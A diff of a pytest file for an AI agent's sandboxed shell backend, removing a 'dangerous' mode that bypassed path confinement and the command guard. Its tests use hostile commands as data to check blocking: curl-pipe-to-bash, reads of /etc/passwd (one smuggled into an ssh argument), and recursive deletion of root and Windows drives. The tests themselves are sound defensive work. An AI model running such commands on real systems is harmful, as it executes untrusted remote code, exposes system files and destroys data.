@@ -125,43 +125,17 @@ class TestValidateCommand:
         assert "/home/username/project" in result
 
 
-class TestValidateCommandDangerous:
-    """dangerous=True drops path confinement but keeps the command blocklist."""
-
-    def test_absolute_path_allowed(self):
-        assert validate_command("cat /etc/passwd", dangerous=True) is None
-
-    def test_traversal_allowed(self):
-        assert validate_command("cat ../../x", dangerous=True) is None
-
-    def test_home_tilde_allowed(self):
-        assert validate_command("cat ~/secrets.txt", dangerous=True) is None
-
-    def test_cd_absolute_allowed(self):
-        assert validate_command("cd /etc && ls", dangerous=True) is None
-
-    def test_sudo_still_blocked(self):
-        assert validate_command("sudo rm x", dangerous=True) is not None
-
-    def test_chmod_still_blocked(self):
-        assert validate_command("chmod 777 /tmp/x", dangerous=True) is not None
-
-    def test_dd_still_blocked(self):
-        assert validate_command("dd if=/dev/zero of=/x", dangerous=True) is not None
-
-    def test_rm_rf_root_still_blocked(self):
-        assert validate_command("rm -rf /", dangerous=True) is not None
-
+class TestValidateCommandDestructive:
     @pytest.mark.parametrize(
         "command",
         ["rm -rf C:/", "rm -rf c:\\", "rm -rf 'C:/Users/you'", 'rm -rf "D:\\data"'],
     )
-    def test_rm_rf_windows_drive_still_blocked(self, command):
+    def test_rm_rf_windows_drive_blocked(self, command):
         """Git Bash's rm takes Windows drive paths; refuse them like `/`."""
-        assert validate_command(command, dangerous=True) is not None
+        assert validate_command(command) is not None
 
-    def test_rm_rf_relative_still_allowed(self):
-        assert validate_command("rm -rf build", dangerous=True) is None
+    def test_rm_rf_relative_allowed(self):
+        assert validate_command("rm -rf build") is None
 
 
 # === convert_virtual_paths_in_command ===
@@ -803,9 +777,7 @@ class TestVirtualMountResolution:
         monkeypatch.setattr(paths, "MEMORIES_DIR", memories_dir)
         monkeypatch.setattr(backends, "_BUILTIN_SKILLS_DIR", builtin_dir)
 
-        backend = CustomSandboxBackend(
-            root_dir=str(workspace), virtual_mode=True, skills_dir=user_dir
-        )
+        backend = CustomSandboxBackend(root_dir=str(workspace), skills_dir=user_dir)
         resp = backend.execute("python /skills/hello-ws/main.py")
         assert resp.exit_code == 0, resp.output
         assert "workspace-tier-fix-works" in resp.output
@@ -840,9 +812,7 @@ class TestVirtualMountResolution:
         monkeypatch.setattr(paths, "MEMORIES_DIR", memories_dir)
         monkeypatch.setattr(backends, "_BUILTIN_SKILLS_DIR", builtin_dir)
 
-        backend = CustomSandboxBackend(
-            root_dir=str(workspace), virtual_mode=True, skills_dir=user_dir
-        )
+        backend = CustomSandboxBackend(root_dir=str(workspace), skills_dir=user_dir)
         resp = backend.execute("python /skills/shadow-test/main.py")
         assert resp.exit_code == 0, resp.output
         assert "WORKSPACE_TIER_WINS" in resp.output
@@ -873,9 +843,7 @@ class TestVirtualMountResolution:
         monkeypatch.setattr(paths, "MEMORIES_DIR", memories_dir)
         monkeypatch.setattr(backends, "_BUILTIN_SKILLS_DIR", builtin_dir)
 
-        backend = CustomSandboxBackend(
-            root_dir=str(workspace), virtual_mode=True, skills_dir=user_dir
-        )
+        backend = CustomSandboxBackend(root_dir=str(workspace), skills_dir=user_dir)
         resp = backend.execute("python /skills/hello-e2e/main.py")
         assert resp.exit_code == 0, resp.output
         assert "global-tier-fix-works" in resp.output
@@ -1042,16 +1010,14 @@ class TestDeleteBlocked:
 
     def test_autoskill_backend_blocks_delete(self, tmp_path):
         (tmp_path / "f.txt").write_text("x")
-        backend = AutoskillProposalSandboxBackend(
-            root_dir=str(tmp_path), virtual_mode=True
-        )
+        backend = AutoskillProposalSandboxBackend(root_dir=str(tmp_path))
         result = backend.delete("/f.txt")
         assert result.error is not None
         assert (tmp_path / "f.txt").exists()
 
     def test_sandbox_backend_delete_enabled_by_default(self, tmp_path):
         (tmp_path / "f.txt").write_text("x")
-        backend = CustomSandboxBackend(root_dir=str(tmp_path), virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=str(tmp_path))
         result = backend.delete("/f.txt")
         assert result.error is None
         assert not (tmp_path / "f.txt").exists()
@@ -1062,25 +1028,25 @@ class TestDeleteBlocked:
 
 class TestResolvePath:
     def test_strip_workspace_prefix(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         # /workspace/main.py should resolve to root/main.py
         resolved = backend._resolve_path("/workspace/main.py")
         assert Path(resolved).parts[-1] == "main.py"
         assert "workspace/workspace" not in str(resolved)
 
     def test_workspace_root(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         resolved = backend._resolve_path("/workspace")
         # Should resolve to root dir
         assert resolved == backend._resolve_path("/")
 
     def test_system_path_with_workspace_marker(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         resolved = backend._resolve_path("/Users/someone/project/workspace/main.py")
         assert Path(resolved).parts[-1] == "main.py"
 
     def test_system_path_without_workspace(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         resolved = backend._resolve_path("/Users/someone/file.py")
         # Falls back to basename
         assert Path(resolved).parts[-1] == "file.py"
@@ -1089,7 +1055,7 @@ class TestResolvePath:
         """_resolve_path uses the actual dir name, not hardcoded 'workspace'."""
         ws = tmp_path / "my-project"
         ws.mkdir()
-        backend = CustomSandboxBackend(root_dir=str(ws), virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=str(ws))
         resolved = backend._resolve_path("/my-project/main.py")
         assert Path(resolved).parts[-1] == "main.py"
         assert "my-project/my-project" not in str(resolved)
@@ -1097,14 +1063,14 @@ class TestResolvePath:
     def test_custom_workspace_name_system_path(self, tmp_path):
         ws = tmp_path / "experiment-1"
         ws.mkdir()
-        backend = CustomSandboxBackend(root_dir=str(ws), virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=str(ws))
         resolved = backend._resolve_path("/Users/someone/experiment-1/data/out.csv")
         # Cross-platform suffix check: ``str(Path)`` uses backslashes on
         # Windows, so testing for the literal POSIX suffix is brittle.
         assert Path(resolved).parts[-2:] == ("data", "out.csv")
 
     def test_normal_virtual_path(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         resolved = backend._resolve_path("/src/main.py")
         assert Path(resolved).parts[-2:] == ("src", "main.py")
 
@@ -1119,7 +1085,7 @@ class TestResolvePath:
         outer = tmp_path / "workspace" / "metasci-scribe" / "metasci-scribe"
         ws = outer / "workspace"
         ws.mkdir(parents=True)
-        backend = CustomSandboxBackend(root_dir=str(ws), virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=str(ws))
 
         # Agent supplies the full literal cwd path
         resolved = backend._resolve_path(str(ws) + "/debate_sim.py")
@@ -1133,7 +1099,7 @@ class TestResolvePath:
         outer = tmp_path / "workspace" / "proj"
         ws = outer / "workspace"
         (ws / "sub").mkdir(parents=True)
-        backend = CustomSandboxBackend(root_dir=str(ws), virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=str(ws))
 
         resolved = backend._resolve_path(str(ws) + "/sub/file.py")
         expected = (ws / "sub" / "file.py").resolve()
@@ -1144,55 +1110,14 @@ class TestResolvePath:
         passing the literal cwd string (no trailing slash, no extra path)
         must resolve to the same path as the virtual root ``/``.
         """
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         assert backend._resolve_path(tmp_workspace) == backend._resolve_path("/")
 
 
-class TestResolvePathDangerous:
-    """Dangerous mode passes real absolute paths through unmangled."""
-
-    def test_absolute_path_unmangled(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, dangerous=True)
-        # OS-appropriate absolute path (drive-anchored on Windows) outside the ws.
-        target = Path(Path(tmp_workspace).anchor, "etc", "hosts")
-        resolved = Path(backend._resolve_path(str(target)))
-        # Dangerous mode must NOT confine/mangle it into the workspace.
-        assert Path(tmp_workspace) not in resolved.parents
-        assert resolved == target
-
-    def test_outside_workspace_not_confined(self, tmp_path):
-        ws = tmp_path / "ws"
-        ws.mkdir()
-        outside = tmp_path / "elsewhere" / "data.csv"
-        backend = CustomSandboxBackend(root_dir=str(ws), dangerous=True)
-        resolved = Path(backend._resolve_path(str(outside)))
-        assert resolved == outside  # real path, not pulled into the workspace
-
-    def test_dangerous_forces_virtual_mode_off(self, tmp_workspace):
-        backend = CustomSandboxBackend(
-            root_dir=tmp_workspace, virtual_mode=True, dangerous=True
-        )
-        assert backend.virtual_mode is False
-
-    def test_dangerous_skips_cwd_literal_rewrite(self, tmp_workspace):
-        """In dangerous mode the cwd->'./' rewrite must NOT mangle real args.
-
-        Regression: a non-path argument that merely contains the cwd string
-        (echo text, grep/git pattern) was being corrupted to './'.
-        """
-        cmd = f'echo "backup of {tmp_workspace}/data"'
-        prepared, error = prepare_sandbox_command(
-            cmd, tmp_workspace, virtual_mode=False, dangerous=True
-        )
-        assert error is None
-        assert prepared == cmd  # unchanged — no './' substitution
-
-    def test_non_dangerous_still_rewrites_cwd_literal(self, tmp_workspace):
-        """Default mode keeps the workspace-literal -> './' rewrite."""
+class TestPrepareCommandCwdLiteral:
+    def test_rewrites_cwd_literal(self, tmp_workspace):
         cmd = f"cat {tmp_workspace}/file.txt"
-        prepared, error = prepare_sandbox_command(
-            cmd, tmp_workspace, virtual_mode=True, dangerous=False
-        )
+        prepared, error = prepare_sandbox_command(cmd, tmp_workspace)
         assert error is None
         assert prepared == "cat ./file.txt"
 
@@ -1202,22 +1127,22 @@ class TestResolvePathDangerous:
 
 class TestSandboxId:
     def test_sandbox_has_id(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         assert isinstance(backend.id, str)
         assert backend.id.startswith("metasci-scribe-")
         assert len(backend.id) == len("metasci-scribe-") + 8
 
     def test_sandbox_id_is_stable(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         assert backend.id == backend.id  # same instance → same id
 
     def test_sandbox_id_unique(self, tmp_workspace):
-        b1 = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
-        b2 = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        b1 = CustomSandboxBackend(root_dir=tmp_workspace)
+        b2 = CustomSandboxBackend(root_dir=tmp_workspace)
         assert b1.id != b2.id
 
     def test_sandbox_id_hex_suffix(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         suffix = backend.id[len("metasci-scribe-") :]
         assert re.fullmatch(r"[0-9a-f]{8}", suffix)
 
@@ -1228,7 +1153,7 @@ class TestSandboxId:
 class TestExecuteValidation:
     @pytest.mark.parametrize("command", ["", None, 123])
     def test_execute_rejects_empty_or_non_string_commands(self, command, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         response = backend.execute(command)
 
@@ -1250,9 +1175,7 @@ class TestExecuteCwdSanitization:
         link.symlink_to(real, target_is_directory=True)
         monkeypatch.setenv("PWD", str(link))
 
-        backend = CustomSandboxBackend(
-            root_dir=str(link), virtual_mode=True, inherit_env=True
-        )
+        backend = CustomSandboxBackend(root_dir=str(link), inherit_env=True)
 
         assert backend.execute("pwd").output.strip() == str(real.resolve())
 
@@ -1273,7 +1196,7 @@ class TestExecuteCwdSanitization:
         monkeypatch.setattr(
             CustomSandboxBackend, "_execute_prepared_command", fake_execute
         )
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         command = f"mkdir -p {tmp_workspace}/test-sanitized && echo ok"
 
         resp = backend.execute(command)
@@ -1296,7 +1219,7 @@ class TestExecuteCwdSanitization:
         monkeypatch.setattr(
             CustomSandboxBackend, "_execute_prepared_command", fake_execute
         )
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         command = (
             "ssh -p 2222 -i key host "
             "'ls -la /media/username/project; ls -la /home/username/project'"
@@ -1322,7 +1245,7 @@ class TestExecuteCwdSanitization:
         )
         workspace = tmp_path / "ws"
         workspace.mkdir()
-        backend = CustomSandboxBackend(root_dir=str(workspace), virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=str(workspace))
         command = f"ssh host 'ls {workspace}/remote-file'"
 
         resp = backend.execute(command, timeout=30)
@@ -1333,7 +1256,7 @@ class TestExecuteCwdSanitization:
     def test_execute_rejects_unquoted_ssh_remote_before_path_conversion(
         self, tmp_workspace
     ):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         resp = backend.execute("ssh host ls /home/username/project", timeout=30)
 
@@ -1352,7 +1275,7 @@ class TestExecuteCwdSanitization:
         monkeypatch.setattr(
             CustomSandboxBackend, "_execute_prepared_command", fake_execute
         )
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         resp = backend.execute("ssh -N host", timeout=30)
 
@@ -1360,7 +1283,7 @@ class TestExecuteCwdSanitization:
         assert captured["command"] == "ssh -N host"
 
     def test_execute_rejects_double_quoted_ssh_remote(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         resp = backend.execute('ssh host "ls /home/username/project"', timeout=30)
 
@@ -1370,7 +1293,7 @@ class TestExecuteCwdSanitization:
     def test_execute_rejects_extra_argv_after_single_quoted_ssh_remote(
         self, tmp_workspace
     ):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         resp = backend.execute("ssh host 'pwd' extra", timeout=30)
 
@@ -1378,7 +1301,7 @@ class TestExecuteCwdSanitization:
         assert "single quoted argument" in resp.output
 
     def test_execute_rejects_double_quoted_ssh_local_substitution(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         resp = backend.execute('ssh host "echo $(cat /etc/passwd)"', timeout=30)
 
@@ -1397,7 +1320,7 @@ class TestExecuteCwdSanitization:
         monkeypatch.setattr(
             CustomSandboxBackend, "_execute_prepared_command", fake_execute
         )
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         command = "ssh host 'echo $(cat /etc/passwd)'"
 
         resp = backend.execute(command, timeout=30)
@@ -1417,7 +1340,7 @@ class TestExecuteCwdSanitization:
         monkeypatch.setattr(
             CustomSandboxBackend, "_execute_prepared_command", fake_execute
         )
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         resp = backend.execute(
             "cat /data/file.txt && ssh host 'ls /home/username/project'",
@@ -1442,7 +1365,7 @@ class TestExecuteCwdSanitization:
         monkeypatch.setattr(
             CustomSandboxBackend, "_execute_prepared_command", fake_execute
         )
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         resp = backend.execute("ssh host 'pwd' > /tmp/out", timeout=30)
 
@@ -1461,7 +1384,7 @@ class TestExecuteCwdSanitization:
         monkeypatch.setattr(
             CustomSandboxBackend, "_execute_prepared_command", fake_execute
         )
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         command = "echo __METASCI_SCRIBE_SSH_REMOTE_0__ && ssh host 'ls /home'"
 
         resp = backend.execute(command, timeout=30)
@@ -1480,7 +1403,7 @@ class TestExecuteCwdSanitization:
         outer = tmp_path / "workspace" / "metasci-scribe" / "metasci-scribe"
         ws = outer / "workspace"
         ws.mkdir(parents=True)
-        backend = CustomSandboxBackend(root_dir=str(ws), virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=str(ws))
 
         target = ws / "probe.txt"
         resp = backend.execute(f"echo hi > {target}")
@@ -1505,7 +1428,7 @@ class TestExecuteCwdSanitization:
         monkeypatch.setattr(
             CustomSandboxBackend, "_execute_prepared_command", fake_execute
         )
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         command = "ssh host 'ls /home/username/project'"
 
         resp = backend.execute(command, timeout=30)
@@ -1514,7 +1437,7 @@ class TestExecuteCwdSanitization:
         assert captured["command"] == command
 
     def test_execute_rejects_unquoted_ssh_remote_for_literal_ssh(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         resp = backend.execute("ssh host ls /home/username/project", timeout=30)
 
@@ -1541,7 +1464,7 @@ class TestExecuteCwdSanitization:
         monkeypatch.setattr(
             CustomSandboxBackend, "_execute_prepared_command", fake_execute
         )
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         resp = backend.execute(f"{ssh_path} host ls /home/username/project", timeout=30)
 
@@ -1560,7 +1483,7 @@ class TestExecuteCwdSanitization:
         monkeypatch.setattr(
             CustomSandboxBackend, "_execute_prepared_command", fake_execute
         )
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         command = "cat /data/file.txt && ssh host 'ls /home/username/project'"
 
         resp = backend.execute(command, timeout=30)
@@ -1579,7 +1502,6 @@ class TestExecuteTruncation:
     def test_execute_truncates_large_output(self, tmp_workspace):
         backend = CustomSandboxBackend(
             root_dir=tmp_workspace,
-            virtual_mode=True,
             max_output_bytes=100,
         )
         # Generate output larger than 100 bytes
@@ -1593,7 +1515,6 @@ class TestExecuteTruncation:
     def test_execute_counts_the_limit_in_utf8_bytes(self, tmp_workspace):
         backend = CustomSandboxBackend(
             root_dir=tmp_workspace,
-            virtual_mode=True,
             max_output_bytes=100,
         )
         # 200 three-byte characters: 600 bytes, cut on a character boundary.
@@ -1606,7 +1527,6 @@ class TestExecuteTruncation:
     def test_execute_no_truncation_small_output(self, tmp_workspace):
         backend = CustomSandboxBackend(
             root_dir=tmp_workspace,
-            virtual_mode=True,
             max_output_bytes=100_000,
         )
         resp = backend.execute("echo hello")
@@ -1621,7 +1541,6 @@ class TestExecuteStderr:
     def test_execute_stderr_attribution(self, tmp_workspace):
         backend = CustomSandboxBackend(
             root_dir=tmp_workspace,
-            virtual_mode=True,
         )
         resp = backend.execute(
             "python -c \"import sys; sys.stderr.write('warning\\n')\""
@@ -1631,7 +1550,6 @@ class TestExecuteStderr:
     def test_execute_nonzero_exit_code_in_output(self, tmp_workspace):
         backend = CustomSandboxBackend(
             root_dir=tmp_workspace,
-            virtual_mode=True,
         )
         resp = backend.execute('python -c "raise SystemExit(42)"')
         assert resp.exit_code == 42
@@ -1640,7 +1558,6 @@ class TestExecuteStderr:
     def test_execute_mixed_stdout_stderr(self, tmp_workspace):
         backend = CustomSandboxBackend(
             root_dir=tmp_workspace,
-            virtual_mode=True,
         )
         resp = backend.execute(
             "python -c \"import sys; print('out'); sys.stderr.write('err\\n')\""
@@ -1651,7 +1568,6 @@ class TestExecuteStderr:
     def test_execute_success_no_exit_code(self, tmp_workspace):
         backend = CustomSandboxBackend(
             root_dir=tmp_workspace,
-            virtual_mode=True,
         )
         resp = backend.execute("echo ok")
         assert resp.exit_code == 0
@@ -1663,13 +1579,13 @@ class TestExecuteStderr:
 
 class TestExecuteTimeout:
     def test_execute_accepts_timeout_kwarg(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         resp = backend.execute("echo hello", timeout=60)
         assert resp.exit_code == 0
         assert "hello" in resp.output
 
     def test_execute_timeout_none_uses_default(self, tmp_workspace):
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
         resp = backend.execute("echo ok", timeout=None)
         assert resp.exit_code == 0
 
@@ -1685,7 +1601,7 @@ class TestExecuteTimeout:
     )
     def test_timeout_kills_descendants_after_shell_leader_exits(self, tmp_workspace):
         """A dead shell leader must not hide descendants retaining its pipes."""
-        backend = CustomSandboxBackend(root_dir=tmp_workspace, virtual_mode=True)
+        backend = CustomSandboxBackend(root_dir=tmp_workspace)
 
         started = time.monotonic()
         response = backend.execute("sleep 2 &", timeout=0.1)
@@ -1707,7 +1623,6 @@ class TestExecuteTimeout:
         monkeypatch.setattr(backends, "_PROCESS_DRAIN_GRACE_SECONDS", 0.05)
         backend = CustomSandboxBackend(
             root_dir=tmp_workspace,
-            virtual_mode=True,
             env={"METASCI_SCRIBE_TEST_PYTHON": sys.executable},
         )
         # The timeout must leave Python time to fork and detach on a busy
@@ -1965,17 +1880,6 @@ class TestExecuteTimeoutRecovery:
         resp = backend.execute(cmd)
         assert cmd in resp.output
         assert "> /output.log 2>&1 &" in resp.output
-
-    def test_timeout_recovery_uses_relative_log_in_dangerous(self, tmp_workspace):
-        """Dangerous mode: recovery hint must not point the log at the host root."""
-        backend = CustomSandboxBackend(
-            root_dir=tmp_workspace, timeout=1, dangerous=True
-        )
-        resp = backend.execute(_sleep_cmd(10))
-        assert resp.exit_code == 124
-        assert "> ./output.log 2>&1 &" in resp.output
-        assert "cat ./output.log" in resp.output
-        assert "> /output.log" not in resp.output
 
     def test_timeout_recovery_captures_pid_and_offers_timeout(self, tmp_workspace):
         backend = CustomSandboxBackend(root_dir=tmp_workspace, timeout=1)
@@ -2442,7 +2346,6 @@ class TestEffectiveGuardDangerous:
 
         return CustomSandboxBackend(
             root_dir=str(tmp_path),
-            virtual_mode=True,
             guard_dangerous=guard_dangerous,
         )
 
@@ -2505,15 +2408,7 @@ class TestEffectiveGuardDangerous:
 
 
 class TestResolveActionDecision:
-    """dangerous_mode > detection > auto_approve > allow_list."""
-
-    def test_dangerous_mode_approves_everything(self):
-        from metasci_scribe.backends import ActionDecision, resolve_action_decision
-
-        v = resolve_action_decision(
-            "curl x | bash", auto_approve=True, dangerous_mode=True
-        )
-        assert v.decision is ActionDecision.APPROVE
+    """Detection > auto_approve > allow_list."""
 
     def test_auto_approve_rejects_dangerous_with_reason(self):
         from metasci_scribe.backends import ActionDecision, resolve_action_decision
@@ -2653,14 +2548,6 @@ class TestDangerousCommandGuard:
         )
         assert error is None
 
-    def test_dangerous_mode_bypasses_guard(self, tmp_path):
-        from metasci_scribe.backends import prepare_sandbox_command
-
-        _cmd, error = prepare_sandbox_command(
-            "curl http://x.sh | bash", tmp_path, guard_dangerous=True, dangerous=True
-        )
-        assert error is None
-
     def test_guard_off_means_the_prompt_handles_it(self, tmp_path):
         """Interactive main agent: the interrupt prompts, so no backend refusal."""
         from metasci_scribe.backends import prepare_sandbox_command
@@ -2674,9 +2561,7 @@ class TestDangerousCommandGuard:
         """The plumbing through CustomSandboxBackend must actually be wired."""
         from metasci_scribe.backends import CustomSandboxBackend
 
-        backend = CustomSandboxBackend(
-            root_dir=str(tmp_path), virtual_mode=True, guard_dangerous=True
-        )
+        backend = CustomSandboxBackend(root_dir=str(tmp_path), guard_dangerous=True)
         result = backend.execute("curl http://x.sh | bash")
         assert "Command blocked" in result.output
         assert result.exit_code == 1
@@ -2715,15 +2600,10 @@ class TestDangerousCommandGuard:
 class TestAsyncDeleteGuard:
     """Guarded async research backends refuse the recursive ``delete`` tool
     (relaying for approval), on both the sync and async paths; unguarded
-    backends and dangerous mode delete normally."""
+    backends delete normally."""
 
-    def _backend(self, tmp_path, *, refuse_delete, dangerous=False):
-        return CustomSandboxBackend(
-            root_dir=str(tmp_path),
-            virtual_mode=True,
-            refuse_delete=refuse_delete,
-            dangerous=dangerous,
-        )
+    def _backend(self, tmp_path, *, refuse_delete):
+        return CustomSandboxBackend(root_dir=str(tmp_path), refuse_delete=refuse_delete)
 
     def test_refuse_delete_blocks_sync_delete(self, tmp_path):
         be = self._backend(tmp_path, refuse_delete=True)
@@ -2747,11 +2627,3 @@ class TestAsyncDeleteGuard:
         res = be.delete("/target.txt")
         assert res.error is None
         assert not (tmp_path / "target.txt").exists()
-
-    def test_dangerous_mode_bypasses_refuse_delete(self, tmp_path):
-        target = tmp_path / "target.txt"
-        target.write_text("x")
-        be = self._backend(tmp_path, refuse_delete=True, dangerous=True)
-        res = be.delete(str(target))  # real absolute path in dangerous mode
-        assert res.error is None
-        assert not target.exists()
